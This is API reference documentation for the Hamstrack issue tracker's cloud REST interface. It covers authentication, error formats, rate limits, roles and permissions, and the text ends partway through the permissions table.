# Hamstrack REST API — Cloud

> Deployment: **Cloud** (`hamstrack.com`). Self-hosting? See the [DC / self-hosted reference](api-dc.md).

This is the reference for the HTTP API behind the Hamstrack web app. Everything the UI does goes through this API, and it is available to users for scripting and integrations. An interactive Swagger UI version lives at [hamstrack.com/docs](https://hamstrack.com/docs); the machine-readable OpenAPI spec is at [`/openapi.yaml`](https://hamstrack.com/openapi.yaml).

**Base URL**

```
https://hamstrack.com/api
```

> **Beta notice:** the API is unversioned while Hamstrack is in beta — breaking changes are possible and are announced in release notes. While the Cloud instance is in test mode, user data may periodically be reset; every account gets a pre-populated demo workspace to explore.

## Contents

- [Quick start](#quick-start)
- [Authentication](#authentication)
- [Conventions](#conventions)
- [Errors](#errors)
- [Roles](#roles)
- [Permissions](#permissions)
- [Custom roles](#custom-roles)
- [Instance metadata](#instance-metadata)
- [Auth endpoints](#auth-endpoints)
- [Workspaces](#workspaces)
- [Onboarding](#onboarding)
- [Projects](#projects)
- [Project configuration](#project-configuration)
- [System administration](#system-administration)
- [Issues](#issues)
- [Comments](#comments)
- [Attachments](#attachments)
- [Labels](#labels)
- [Components](#components)
- [Versions](#versions)
- [Sprints & backlog](#sprints--backlog)
- [Reports](#reports)
- [Search (HQL)](#search-hql)
- [Saved filters](#saved-filters)
- [Notifications](#notifications)
- [Real-time events (SSE)](#real-time-events-sse)

## Quick start

```bash
BASE=https://hamstrack.com/api

# 1. Log in (register + verify your email first — see Auth endpoints)
TOKEN=$(curl -s -X POST $BASE/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"you@example.com","password":"your-password"}' | jq -r .accessToken)

# 2. List your workspaces
curl -s $BASE/workspaces -H "Authorization: Bearer $TOKEN"

# 3. Create an issue
curl -s -X POST $BASE/workspaces/{workspaceId}/projects/{projectId}/issues \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"title":"Fix the flux capacitor","typeId":"…","statusId":"…","priorityId":"…"}'
```

## Authentication

Hamstrack uses short-lived **JWT access tokens** plus a rotating **refresh-token cookie**:

1. `POST /auth/register` → a verification email is sent.
2. `POST /auth/verify-email` with the emailed token → returns an access token (and logs you in).
3. `POST /auth/login` → returns an access token in the body and sets the `refresh_token` cookie (`HttpOnly`, `Secure`, `SameSite=Strict`, scoped to `/api/auth`).
4. Send the access token on every request:

   ```
   Authorization: Bearer <accessToken>
   ```

5. When the access token expires (`expiresIn` seconds, currently 30 min), call `POST /auth/refresh` — the cookie authenticates the call and is **rotated** on each use (an old cookie value becomes invalid). Refresh tokens live 30 days.
6. `POST /auth/logout` revokes the refresh token and clears the cookie.

All endpoints except [Auth endpoints](#auth-endpoints) and [Instance metadata](#instance-metadata) require the `Authorization` header. A missing or expired token yields `401 Unauthorized`.

## Conventions

- **Format** — request and response bodies are JSON (`Content-Type: application/json`), UTF-8. The only exceptions: attachment upload (`multipart/form-data`), attachment download (binary), and the [report CSV exports](#csv-exports--the-chart-as-a-file) (`text/csv; charset=UTF-8`, sent as an attachment). Error bodies stay `application/problem+json` on every one of those, including the CSV paths.
- **IDs** — all identifiers are UUIDs, except issues, which are addressed by their **project-scoped number** (the `42` in `DEMO-42`).
- **Timestamps** — ISO-8601 with UTC offset, e.g. `2026-07-14T06:24:41.486119Z`. Date-only fields (`dueDate`) use `YYYY-MM-DD`.
- **Partial updates** — `PATCH` endpoints accept any subset of fields; omitted (or `null`) fields are left unchanged.
- **Access model** — a resource you cannot see returns `404 Not Found`, whether it doesn't exist or you simply aren't a member of its workspace. Membership is never revealed via `403`.
- **Optimistic locking** — issues carry a `version`; send it back in `PATCH` and get `409 Conflict` if someone changed the issue in between (see [Issues](#issues)). Omitting it is last-write-wins for the fields you send — but not a guarantee of success: if a competing write commits while your request is in flight, you get the same `409` from the database's own check. Either way a lost race is always a `409` telling you to refresh and retry, never a `500`.
- **Pagination** — paginated list endpoints accept `page` (zero-based, default `0`) and `size` (default `50`, clamped server-side to a maximum of `100`) and return a uniform envelope:

  ```json
  { "content": [ /* rows */ ], "page": 0, "size": 50, "totalElements": 137, "totalPages": 3, "hasNext": true }
  ```

  Currently paginated: [`GET /admin/users`](#system-administration), issue [comments](#comments) and [history](#issues), and the issue [list](#issues) **when `size` is passed**. The issue list is the deliberate exception — without `size` it returns a `BoardIssuesResponse` object (a server-capped list; the board needs every card, but not an unbounded one), switching to the envelope only when `size` is present.

## Errors

Errors follow [RFC 9457 Problem Details](https://www.rfc-editor.org/rfc/rfc9457) (`application/problem+json`):

```json
{
  "type": "about:blank",
  "title": "Conflict",
  "status": 409,
  "detail": "Issue was modified by someone else — refresh and retry"
}
```

### Validation failures (`400`)

A request body that fails validation answers with a `detail` naming every offending field **and** an `errors` object keyed by the JSON path of the field:

```json
{
  "type": "about:blank",
  "title": "Bad Request",
  "status": 400,
  "detail": "key: Key must be uppercase letters and digits only; name: must not be blank",
  "errors": {
    "key": "Key must be uppercase letters and digits only",
    "name": "must not be blank"
  }
}
```

Rules worth coding against:

- **`detail` and `errors` always agree** — same entries, same order. `detail` is those entries joined with `"; "`, each rendered as `<field>: <message>`; the field prefix is dropped when the message already starts with the field path, so a full-sentence message isn't stuttered back.
- **Keys are JSON field paths**, nested ones included: `delivery.preset`, `items[3].fieldId`.
- **Cross-field (class-level) rules use the empty-string key `""`** — they belong to no single field. Their message is rendered bare in `detail`, without a prefix.
- **At most 10 entries are reported**, sorted by their rendered line. If more fields failed, `detail` ends with `"; … and 3 more"` (the number of entries not shown); `errors` carries the same 10.
- **Messages are always English**, whatever the request's `Accept-Language`. Constraint text used to follow the caller's locale; it is now pinned by design, so the wording is stable — but treat it as human-readable text, not a machine-readable code, and match on `errors` keys (field paths) instead.
- **One message per field** — if a field breaks several constraints, the first failure wins.
- A body that can't be parsed at all (malformed JSON, a wrong JSON type) is still a `400`, but carries **no** `errors` map: nothing was ever bound.
- **Not every `400` is a validation failure.** A rule that spans fields and is enforced in the service rather than by a field constraint — sending `boardMode` and a disagreeing [`delivery.board`](#delivery-capabilities), for instance — answers a plain problem detail: `detail` explains it, and there is **no** `errors` map. Read `errors` defensively.

Uploads have two size ceilings and the `413` wording tells them apart: the in-app per-file limit answers `"File exceeds the 20 MB limit"`, while the servlet multipart ceiling answers `"File is too large"`.

**A lost row-lock race is a retryable `409`, not a `500`.** A few mutations take row locks so that an invariant holds under concurrency — membership changes are the main ones — and when two of them overlap the database resolves it by rolling one back (a deadlock or a lock timeout). Those transactions also **bound how long they will wait** for a lock (3 s by default), so a pile-up drains instead of hanging until a client gives up; exceeding the bound is this same `409`, never a `500`. Nothing is left half-applied, so the loser is told to try again rather than shown a fault: `409` with `detail: "Someone else is changing this right now — try again in a moment"` and a `Retry-After: 1` header, the same retry shape [rate limiting](#rate-limits) uses. This is app-wide, not a property of one endpoint, and it is the **only** `409` worth retrying automatically: an invariant conflict (a stale `version`, a name in use, the last owner) will answer identically until something changes. Retry the **identical** request after the header's seconds — change nothing about it.

Tell this variant apart by the **`Retry-After` header**, never by the wording of `detail` — and note that it deliberately carries **no `errorType`**. It needs no discriminator: the header is the signal, and it is the one place where the "unknown or absent `errorType` means no retry" rule below would give exactly the wrong answer. Check the header first, then `errorType`.

Some conflicts carry an **extra machine-readable member** so a client can recover in one round-trip. Creating a [label](#labels) whose name is taken — or renaming one into a taken name — returns `409` with the id of the label that already owns it:

```json
{
  "type": "about:blank",
  "title": "Conflict",
  "status": 409,
  "detail": "A label named 'needs-design' already exists in this workspace",
  "existingId": "0198c4a1-…"
}
```

**`errorType` says which failure a body is**, wherever one status covers more than one. It is a plain string extension, stable and safe to branch on where the wording of `detail` is not: an [invalid HQL query](#search-hql) carries `PARSE_ERROR` or `SEMANTIC_ERROR`, a member removal refused over project administrators carries `STRANDED_PROJECTS`, `ADOPTION_BLOCKED` or `ADOPTION_ROLE_UNREADABLE`, and a change that would leave a project administered by nobody at all carries `STRANDED_BY_INHERITANCE`. Two rules for consuming it: treat a value you do **not** recognise as "no recovery I know about" rather than guessing at one, and do **not** read its *absence* as an unknown value — a response that needs no discriminator simply has none (the lock-contention `409` above is exactly that case, and is identified by `Retry-After` instead). It is also **not a `409`-only member**: one `403` carries it too — [`REACTIVATED_DEFAULT_ABOVE_CEILING`](#reactivated_default_above_ceiling--a-403-that-names-projects), when restoring open project access would bring back a per-project default the caller may not set — and the very same endpoints answer the plain [grant-ceiling](#the-grant-ceiling) `403` with none at all, so the absence rule matters there exactly as much as it does for lock contention. Being a `403` it stands outside the `Retry-After`-first rule, which sorts `409`s only.

[Removing a workspace member](#managing-members) that would leave projects without an administrator follows the same precedent, with an array instead of a single id — plus an `errorType` saying which of that endpoint's two stranded-project refusals it is:

```json
{
  "type": "about:blank",
  "title": "Conflict",
  "status": 409,
  "detail": "Removing this member would leave 4 projects without an administrator: Alpha (P17), Bravo (P42), Charlie (P8) and 1 more. Give each another administrator first, or repeat this request with adoptStrandedProjects=true to take them over yourself.",
  "errorType": "STRANDED_PROJECTS",
  "projects": [
    { "id": "0198c4a1-…", "key": "P17", "name": "Alpha" },
    { "id": "0198c4a2-…", "key": "P42", "name": "Bravo" },
    { "id": "0198c4a3-…", "key": "P8",  "name": "Charlie" },
    { "id": "0198c4a4-…", "key": "P90", "name": "Delta" }
  ]
}
```

**The three parts have three audiences.** `detail` is prose meant to be rendered verbatim, and it is **capped at three project names** followed by `and N more`. `projects` is **uncapped** — it lists every affected project, ordered by `key`, with the ids a client needs to render them as links. `errorType` is the discriminator your code branches on. Read `projects` and `errorType`; never parse `detail`, whose wording is not part of the contract. `detail` also names the retry that clears the refusal (`adoptStrandedProjects=true`), so the sentence stands on its own for a human who never sees the extensions — see [Managing members](#managing-members) for what that retry actually does. `errorType: "STRANDED_PROJECTS"` is the machine-readable statement that this retry is available.

**The same body carries a second, different refusal.** When the caller *did* ask to take those projects over (`adoptStrandedProjects=true`) but at least one of them cannot be taken over — the caller's own role there already grants something the adoption role does not, so adopting would demote them — the answer is again `409` with the same `projects` array, this time listing only the projects that block it. What differs is `errorType`, which is `"ADOPTION_BLOCKED"` rather than `"STRANDED_PROJECTS"`, and `detail`, which names the obstacle instead of offering the retry — because retrying with the flag would fail in exactly the same way.

```json
{
  "type": "about:blank",
  "title": "Conflict",
  "status": 409,
  "detail": "Your own role in Alpha (P17) holds more than “Team lead” does, so taking it over would take that away from you and nobody could give it back. Ask the member you are removing to appoint another administrator there while they still can, or have another workspace administrator who does not already work in that project run the removal instead.",
  "errorType": "ADOPTION_BLOCKED",
  "projects": [
    { "id": "0198c4a1-…", "key": "P17", "name": "Alpha" }
  ]
}
```

**`errorType` tells them apart** — they share a status and a `projects` extension, and a client that only renders "these projects are in the way" stays correct without knowing which one it received, but one that offers a *retry* must know, because they demand opposite behaviour:

| `errorType` | What it means | What a client should offer |
|---|---|---|
| `STRANDED_PROJECTS` | The ordinary refusal | Repeating the request with `adoptStrandedProjects=true` **will** clear it — an adopt button is safe |
| `ADOPTION_BLOCKED` | That retry has already been made and cannot work | **No retry.** Render `detail`; the way out is somebody else's action |
| `ADOPTION_ROLE_UNREADABLE` | The adoption stopped on unreadable stored data, not on permissions | **No retry, and no remedy any party to the request holds.** Render `detail`; it needs an operator |
| `STRANDED_BY_INHERITANCE` | The listed projects were administered only through a project's **default role**, and this change takes that inheritance away | **No retry** — the adopt flag would narrow the adopter. Render `detail`: give each named project an explicit administrator first, or choose a default that also manages members |

**A third refusal, split out of `ADOPTION_BLOCKED` because it needs a different reader.** `ADOPTION_ROLE_UNREADABLE` means the adoption stopped on stored *data* rather than on permissions: the caller's own membership row in one of the listed projects refers to a role the server cannot resolve, so it refuses to overwrite a row it cannot read. That is corrupt or hand-edited data, which a normal client never meets. The split is not cosmetic — `ADOPTION_BLOCKED` is cleared by a named third party's action, while this one is cleared by **nobody present**: retrying fails identically, and nothing the caller or the member being removed can change will help. It needs an operator to repair the stored row, and the server has already logged what is wrong with it. While the two shared a code they also shared copy, and that copy asserted a cause this branch never tested and prescribed a remedy that could not work on it.

**When both apply at once, the unreadable one is reported first.** Either refusal ends the request, so one of them is necessarily second — and it should not be the one no present party can clear, or the caller is sent off to arrange a handover only to meet a second `409` they cannot clear either.

Treat an `errorType` you do not recognise exactly as `ADOPTION_BLOCKED`: **no retry available**. It is the only safe default, because it is the one that cannot invent a button that `409`s again. `ADOPTION_ROLE_UNREADABLE` is that rule's own evidence: a client written before the code existed, which followed the rule, was already correct for it on the day it shipped and needed no change at all. Do not branch on the wording of `detail`, which is prose and may change. And do not confuse an unknown value with an *absent* one — a `409` from this endpoint with no `errorType` at all is a different failure entirely (the last-owner invariant, or [lock contention](#errors), which **is** retryable and says so with `Retry-After`). See [Managing members](#managing-members) for the way out of each.

| Status | Meaning |
|---|---|
| `400` | Malformed request or failed validation |
| `401` | Missing/expired/invalid access token |
| `403` | Authenticated and a member, but missing a [permission](#permissions) — the failure names it in `detail` |
| `404` | Not found — or not a member of the containing workspace |
| `409` | Conflict: stale `version`, duplicate name/key, resource in use, or a state invariant (the last owner, the last project administrator, a [built-in role](#built-in-roles-are-read-only)) — **plus** the one retryable case above, a lost row-lock race, which carries `Retry-After`. Several of these carry an `errorType` discriminator; see [the role `409`s](#the-409-codes-on-role-writes) for the full list and the order to check them in |
| `413` | Attachment exceeds the per-file size limit (default 20 MB) or the servlet upload ceiling (default 25 MB) |
| `415` | Attachment file extension is not in the allow-list |
| `422` | Semantically invalid reference (unknown status/type/assignee, a user who [may not be assigned](#assignability--a-422-not-a-403) in this project, workflow-forbidden transition, an [unusable role reference](#unknown-role--a-422), an [unknown or wrong-scope permission](#scope-is-immutable-and-permissions-must-match-it)) or a request that names a role with [neither or both](#naming-a-role-roleid-and-the-deprecated-role-key) of `roleId` / `role` |
| `429` | Rate limited — wait the number of seconds in the `Retry-After` header |

### Rate limits

The sensitive auth endpoints (`login`, `register`, `verify-email`, `resend-verification`, `forgot-password`, `reset-password`) share a **per-IP budget of 15 requests per minute**. Additionally, repeated failed logins for one account trigger an **exponential backoff** (starting at 30 s after 5 consecutive failures, doubling per failure, capped at 15 min); a successful login resets the counter. Both mechanisms respond with `429` and a `Retry-After` header (seconds).

**Three** non-auth surfaces have throttles of their own. [`POST …/issues/{number}/rank`](#sprints--backlog) allows at most one whole-project rank *rebalance* per project per 60 s and answers `429` + `Retry-After` for a second one inside that window; it is a retryable throttle, not a fault — nothing was moved. Every [report](#reports) — the six under `…/reports/**` plus [`POST …/search/insights`](#insights--break-down-the-query-in-the-search-box), which is bound to the same limiter explicitly because it does not sit under that path — shares **one per-principal budget of 60 requests per minute**. And the whole HQL surface `…/search/**` — [`POST …/search`](#search-hql), `…/search/schema`, `…/search/suggest` **and** the insights panel — shares a **second, separate** per-principal budget of **120 requests per minute**. [Saved filters](#saved-filters) (`…/filters/**`) are on that second budget too: validating a filter's HQL builds the same resolution context `…/search/schema` pays for, so an invalid-body loop there is the same cost wearing different clothes. The two are deliberately not one pot: somebody typing in a search box legitimately fires several requests a minute and must not be starved to protect charts.

**`POST …/search/insights` is inside both patterns: it spends *both* budgets, and the lower configured value binds.** It sits on the reports limiter deliberately, because removing that binding would raise the panel’s allowance to the search budget as a side effect. Do not assume which of the two governs — that follows from whatever an operator has configured, so lowering *either* property lowers the panel. **A panel refresh therefore competes with report fetches *and* with searches.**

Both per-principal budgets are checked **before** the workspace and project are resolved — the one place in this API where a `429` precedes a `404` — and being keyed on the principal they bound **one user, not one workspace**: aggregate load still scales with member count (see [Reports](#reports)). Beyond these three **budgets** and the auth endpoints above, nothing else in this API is rate-limited. Note that a budget is not a path: saved filters are throttled without sitting under `…/search/**`, because what earns a throttle is the work a handler does, not where it is mounted.

## Roles

**System role** (`ADMIN` — instance-wide, maintains the global taxonomy via [`/admin/**`](#system-administration)), **workspace roles** (`OWNER`, `ADMIN`, `MEMBER`) and **project roles** (`MANAGER`, `TEAM_LEAD`, `MEMBER`, `COMMENTER`, `VIEWER`). `GET /auth/me` returns your `systemRole`.

These are the **built-in** roles, and what follows is what each one *grants* — not a rung it occupies. A workspace can also define [roles of its own](#custom-roles); those are composed from the same permission keys and are described in their own section. The server no longer compares roles anywhere: every gate is a [permission](#permissions) check, the role is just the bundle of permissions a member happens to hold.

| Action | Permission — and which built-in roles grant it |
|---|---|
| See a workspace and its projects, issues, members | workspace membership; no permission |
| Create a project | `project.create` — every workspace role (creator becomes project `MANAGER`) |
| Invite a member, change a member's role, remove a member | `workspace.member.manage` — workspace `OWNER`/`ADMIN` |
| Manage the **global** taxonomy (statuses / priorities / issue types / fields / workflows / sets) and any project's bindings | system `ADMIN` |
| Manage **workspace-scoped** taxonomy and the bindings of projects in the workspace | `workspace.taxonomy.manage` — workspace `OWNER`/`ADMIN` ([delegated](#delegated-administration)) |
| Manage **project-private** taxonomy and this project's bindings | `project.taxonomy.manage` — project `MANAGER` only ([delegated](#delegated-administration)) |
| Edit a project | `project.edit` — project `MANAGER`, plus workspace `OWNER`/`ADMIN` across every project of their workspace |
| Archive a project | `project.archive` — project `MANAGER` only |
| Manage a project's members | `project.member.manage` — project `MANAGER` and `TEAM_LEAD` |
| Create / edit issues, move them on the board, rank the backlog | `issue.create`, `issue.edit`, `issue.transition`, `issue.assign`, `issue.rank` — project `MANAGER`, `TEAM_LEAD` and `MEMBER` |
| Delete an issue | `issue.delete` — project `MANAGER` |
| Comment on an issue | `comment.create` — project `MANAGER`, `TEAM_LEAD`, `MEMBER`, `COMMENTER` |
| Edit a comment | `comment.edit`, **own-only at every role** — nobody may edit another person's words |
| Delete a comment | `comment.delete` — your own for `TEAM_LEAD`/`MEMBER`/`COMMENTER`, **anyone's** for project `MANAGER` (moderation) |
| Attach a file | `attachment.create` — project `MANAGER`, `TEAM_LEAD`, `MEMBER`, `COMMENTER` |
| Delete an attachment | `attachment.delete` — your own uploads for `TEAM_LEAD`/`MEMBER`/`COMMENTER`, anyone's for project `MANAGER` |
| Create a [label](#labels) (and attach labels to issues) | `label.create` — every workspace role (attaching is `issue.edit`) |
| Rename / recolor / describe a label | `label.manage` — unrestricted for workspace `OWNER`/`ADMIN`, own-only (labels you created) for `MEMBER` |
| Archive / unarchive / merge / delete a label | `label.manage` **unrestricted** — workspace `OWNER`/`ADMIN` |

The table is the human summary; the machine-readable form of the same idea is [permissions](#permissions) — `GET /permissions` for the catalog, and `myPermissions` on each workspace and project response for what the caller actually holds. Write clients against permission keys, which are permanent, rather than against role names.

**A project administrator can now delete other people's comments.** Until this release nobody could — not a project `MANAGER`, not a workspace `OWNER` — because the only rule was authorship. The built-in project `MANAGER` holds `comment.delete` unrestricted, so moderation is finally possible. Note the deliberate asymmetry with `comment.edit`, which stays own-only *at every role and is not grantable any other way*: deleting someone's comment is moderation, editing it is impersonation. A workspace `OWNER`/`ADMIN` who holds no project membership row does **not** get this — `comment.delete` is not part of the workspace-wide curator set.

**`TEAM_LEAD` ("Team lead") is a new built-in project role.** It grants everything the contributor role (`MEMBER`) grants — create, edit, transition, assign and rank issues, comment, attach files, put issues into a sprint — **plus `project.member.manage`**, and nothing else. It deliberately holds none of the authority that destroys or reconfigures a project: no `issue.delete`, no unrestricted `attachment.delete`, no `project.archive`, `project.edit` or `project.taxonomy.manage`, and none of `sprint.manage` / `version.manage` / `component.manage`. A team lead runs the roster, not the work.

**Why contributor-plus-one, rather than `project.member.manage` on its own** — which looks like the tighter role and is not. An explicit project membership row *replaces* whatever a member would otherwise hold in that project, so a membership-only role would silently strip the issue and comment rights they already had, and the [grant ceiling](#projects) (which also bounds the role a removal leaves someone on) would then stop them undoing it. Measured against what an ordinary member can already do in a project, the delta of `TEAM_LEAD` is exactly `project.member.manage`. It is the role an [adoption](#managing-members) grants.

### Role values are keys, not an enum

Every `role` field on the wire — the `role` you send to `POST …/invites`, `PATCH …/members/{userId}` and `POST …/projects/{pId}/members`, the `role` in a member response, and `myRole` on a workspace or project — is a **role key string**. The values above (`OWNER`, `ADMIN`, `MEMBER`; `MANAGER`, `TEAM_LEAD`, `MEMBER`, `COMMENTER`, `VIEWER`) are the keys of the built-in roles, and every key that existed before this release is spelled exactly as it always was, so nothing that reads or sends them breaks. Three notes on the project side: `TEAM_LEAD` is a **new value in both directions** — assignable through `POST …/projects/{pId}/members`, and returned in a member's `role` and in a project's `myRole`, so a client that enumerates project role values exhaustively will meet one it has never seen; `COMMENTER` is **newly assignable** through the API (it was rejected before); and `VIEWER` is accepted but [stored as `MEMBER`](#projects).

**Do not switch exhaustively on a role value.** It is a string, not a closed set: the field is typed as an open string precisely because a workspace will be able to define roles of its own, and the key of such a role will travel in exactly these fields. A `switch` with no default, a TypeScript union that fails to parse an unrecognized value, or an enum deserializer that throws will break the day it meets one. Treat an unrecognized role as "a role I do not have a label for" — display it, do not decide with it. For decisions there is `myPermissions`, which is a flat list of keys and needs no such exhaustiveness.

### Naming a role: `roleId`, and the deprecated `role` key

A workspace can now define [roles of its own](#custom-roles), and a custom role has no key you could have hard-coded. So every endpoint that assigns a role accepts the role's **id**:

| Method | Path | Fields |
|---|---|---|
| `POST` | `/workspaces/{wsId}/invites` | `roleId` *(new)* · `role` *(deprecated)* |
| `PATCH` | `/workspaces/{wsId}/members/{userId}` | `roleId` *(new)* · `role` *(deprecated)* |
| `POST` | `/workspaces/{wsId}/projects/{pId}/members` | `roleId` *(new)* · `role` *(deprecated)* |
| `PATCH` | `/workspaces/{wsId}/projects/{pId}/members/{userId}` | `roleId` only — the endpoint is new, so it has no legacy form |

**Exactly one of `roleId` and `role` must be present.** Sending neither, or both, is a `422`:

```json
{ "type": "about:blank", "title": "Unprocessable Content", "status": 422,
  "detail": "Send either roleId or role, not both — they do not always mean the same role" }
```

**Both is refused rather than resolved by precedence**, because the two fields do not always mean the same role: `role` resolves built-ins only and, on the project side, still maps `VIEWER` onto the contributor role, while `roleId` addresses any assignable role verbatim. A silent winner would store a role the caller did not ask for, in the one part of the product where that is a privilege change.

**`role` is deprecated but still works, unchanged.** Nothing that sends it breaks in this release; it simply cannot name a custom role, and on the project side it keeps the `VIEWER → MEMBER` translation. Move to `roleId` when convenient. One thing `roleId` unlocks immediately: naming the built-in **Viewer** by id stores the built-in Viewer, so a genuinely read-only project membership is expressible for the first time.

Get the ids from [`GET /workspaces/{wsId}/roles`](#custom-roles), which is open to any workspace member.

**Unusable ids answer the same `422` as unusable keys** — one indistinguishable answer for unknown, foreign and wrong-scope, so the endpoint cannot be used to probe what exists in a workspace you cannot see. The one place a role id answers `404` instead is when it is a **path** segment (`/roles/{roleId}`, and the duplicate source): that is an address, not a value, and it behaves like every other addressed resource.

### Reading a role: `roleId` beside the key

Every member listing carries **`roleId`** beside `role` — a UUID naming the exact role row in [`GET /workspaces/{wsId}/roles`](#custom-roles), and the only field you should match a member against that catalog with. It is purely additive: `role` stays, is **not** deprecated, and still carries the key.

| Response | Where you see it |
|---|---|
| workspace member | `GET /workspaces/{wsId}/members`, `PATCH /workspaces/{wsId}/members/{userId}` |
| project member | `GET`, `POST` and `PATCH` on `/workspaces/{wsId}/projects/{pId}/members` |

```json
{ "userId": "…", "email": "mia@example.com", "displayName": "Mia", "avatarUrl": null,
  "roleId": "0198c4a1-…", "role": "ADMIN", "joinedAt": "…" }
```

**Why it exists: a key is not an identity.** A key is unique only within one *(workspace, scope)* pair, so one string can name two entirely different roles — `MEMBER` is the key of the built-in **workspace Member** *and* of the built-in **project Contributor**: two roles, two ids, two different permission sets. A client that resolves a member's role by key against a catalog covering both scopes can therefore name the wrong privilege **today**, with no custom role involved anywhere. Within a single *(workspace, scope)* a duplicate key — or a custom role colliding with a built-in one — cannot currently be created, because custom keys are [generated server-side and suffixed on collision](#creating-a-role-means-duplicating-one). So this is about identity being the wrong shape, not about a live collision.

Display `role`, resolve `roleId`. Keys remain useful as labels, and as the legacy way to *send* a built-in role ([deprecated on the request side](#naming-a-role-roleid-and-the-deprecated-role-key)); they are not identifiers.

`myRole` on a workspace or project response has no id counterpart in this release — it stays display-only, and the field to decide with is [`myPermissions`](#permissions).

### When a role reads `null`

`role` on a member listing, and `myRole` on a workspace or project **list**, can be `null`. It means the server refused to describe that row's role — the stored role failed an internal scope/ownership check — and deliberately did not substitute anything in its place, because the refused role's name is precisely what must not be rendered.

**`roleId` degrades with `role`, never past it.** On a member listing the two are `null` together and never separately: a row whose stored role was refused answers `role: null` **and** `roleId: null`. That is deliberate — emitting the id would hand the withheld name straight back, because the client would resolve it in the role catalog and print it. So read `roleId: null` as meaning exactly what `role: null` means: **this row's role is not nameable** — not "this member has no role".

The entry is kept rather than dropped: one bad row must not `404` an entire People tab or workspace list. Where permissions are involved they degrade to the floor — a degraded workspace entry carries `myPermissions: []`, and a degraded project membership contributes nothing rather than falling back to a default that would *widen* the member. Render such an entry with no role rather than guessing one; nothing else about it changes.

One asymmetry worth knowing: a workspace in that state still appears in `GET /workspaces` and answers `404` on `GET /workspaces/{id}`. A list is a directory; a detail read is an authorization.

### Unknown role — a `422`

Any endpoint that accepts a `role` answers **`422` `"Unknown role: <what you sent>"`** when the value cannot be assigned: an unknown key, a correctly-spelled key from the *other* scope (`MANAGER` on a workspace endpoint, `OWNER` on a project one), the wrong case (`owner`), or — once workspace-defined roles exist — a role belonging to a workspace you cannot see.

```json
{ "type": "about:blank", "title": "Unprocessable Content", "status": 422,
  "detail": "Unknown role: SUPERUSER" }
```

**One answer for all of those, on purpose.** It would be natural to expect `404` for a role that does not exist here and something else for nonsense; that pair would be an oracle — ask with a role reference and learn from the status code whether it names something real in a workspace you have no access to. So every unusable role value gets the identical `422`, and the `detail` only ever echoes what the caller already sent. `400` would be wrong for the opposite reason: the request is perfectly well-formed, it is the *value* that cannot be honoured — the same shape as `"Unknown label"` or `"Unknown sprint"`.

A body that names the role **in neither way** is now this `422` too, not a `400` — see [Naming a role](#naming-a-role-roleid-and-the-deprecated-role-key). What stays a `400` is a body that is not valid JSON, or a field that fails ordinary [validation](#validation-failures-400) such as a `role` string longer than 40 characters.

**Permission first, then the value.** The gate on the endpoint is checked before the role value is resolved, so a caller who lacks `workspace.member.manage` gets `403` even when the role they sent was also nonsense. Fix the permission, then re-send to discover the `422`.

## Permissions

Roles resolve to **permissions** — flat, stable string keys such as `issue.transition` or `sprint.manage`. Two surfaces expose them: `GET /permissions` describes every permission the product defines, and `myPermissions` on each workspace and project response tells you which of them *you* hold there.

### The catalog — `GET /permissions`

| Method | Path | Auth | Description |
|---|---|---|---|
| `GET` | `/permissions` | ✔ | Every permission this instance defines |

Static product metadata, not tenant data: no workspace context, no path or query parameters, no database access, and the same body for every caller on a given version. Fetch it once and cache it for the session. It still needs a valid access token (`401` without one).

The response is a JSON array of catalog entries in a stable order — workspace-scoped first, then project-scoped:

```json
[
  { "key": "workspace.member.manage", "scope": "WORKSPACE", "supportsOwn": false, "ownRequired": false, "capability": null },
  { "key": "label.manage",            "scope": "WORKSPACE", "supportsOwn": true,  "ownRequired": false, "capability": null },
  { "key": "issue.transition",        "scope": "PROJECT",   "supportsOwn": false, "ownRequired": false, "capability": null },
  { "key": "comment.edit",            "scope": "PROJECT",   "supportsOwn": true,  "ownRequired": true,  "capability": null },
  { "key": "sprint.manage",           "scope": "PROJECT",   "supportsOwn": false, "ownRequired": false, "capability": "BOARD" }
]
```

| Field | Type | Meaning |
|---|---|---|
| `key` | string | The permanent wire key: `area.action`, lowercase, dot-separated, at most 64 chars, **never containing a `:`**. This is the exact string that appears in `myPermissions` (optionally suffixed with `:own`). |
| `scope` | `WORKSPACE` \| `PROJECT` | Which object the permission is granted on, and therefore which response carries it: a `WORKSPACE` key can only appear in a workspace's `myPermissions`, a `PROJECT` key only in a project's. |
| `supportsOwn` | boolean | Whether a grant may be narrowed to objects the caller owns — i.e. whether you may ever see this key with the `:own` suffix. `false` for most entries. |
| `ownRequired` | boolean | Whether the permission can **only** be granted own-only. Implies `supportsOwn: true`, and means the bare key never appears in any `myPermissions` — only the `:own` form does. Today this is true for `comment.edit` alone: editing someone else's words is not a permission the product grants at any role. |
| `capability` | `BOARD` \| `RELEASES` \| `null` | The [delivery capability](#delivery-capabilities) the permission is *about* — a labelling hint, **never a check**, and `null` for most entries. |

**`GET /permissions` is the authoritative list — the table below is a reading aid.** The catalog grows between releases and the endpoint is always in sync with what the server enforces, so drive a role picker or a permission legend from it rather than from this page, and never hard-code a count. Individual keys, on the other hand, are permanent: they are the wire contract and are never renamed. The table is reproduced here because [composing a custom role](#custom-roles) means choosing keys, and choosing them from prose you can read is easier than from a JSON dump.

There are **29** entries at the time of writing — 9 workspace-scoped, 20 project-scoped. "Own?" is `supportsOwn`, i.e. whether a grant may be narrowed to objects you own.

| Key | Scope | Own? | What it allows |
|---|---|---|---|
| `workspace.edit` | `WORKSPACE` | — | Rename/describe the workspace; set the project-access mode and the workspace default project role |
| `workspace.member.manage` | `WORKSPACE` | — | Invite people, change a member's workspace role, revoke pending invites |
| `workspace.role.manage` | `WORKSPACE` | — | Create / edit / delete [custom roles](#custom-roles). Deliberately separate from `workspace.member.manage` |
| `workspace.taxonomy.manage` | `WORKSPACE` | — | The workspace-scoped catalog & sets and the project-binding matrix ([delegated admin](#delegated-administration)) |
| `project.create` | `WORKSPACE` | — | Create a project in this workspace (workspace-scoped despite the prefix — there is no project yet to scope it to) |
| `project.curate.all` | `WORKSPACE` | — | Hold `project.edit`, `component.manage`, `version.manage` and `sprint.manage` in **every** project of the workspace without being a project member. This is the workspace-wide "curator set" other sections refer to |
| `project.administer.all` | `WORKSPACE` | — | Hold **every** project permission in every project of the workspace without being a member. Held by **no built-in role** — only an [Owner can mint it](#the-grant-ceiling) |
| `label.create` | `WORKSPACE` | — | Create a workspace [label](#labels) |
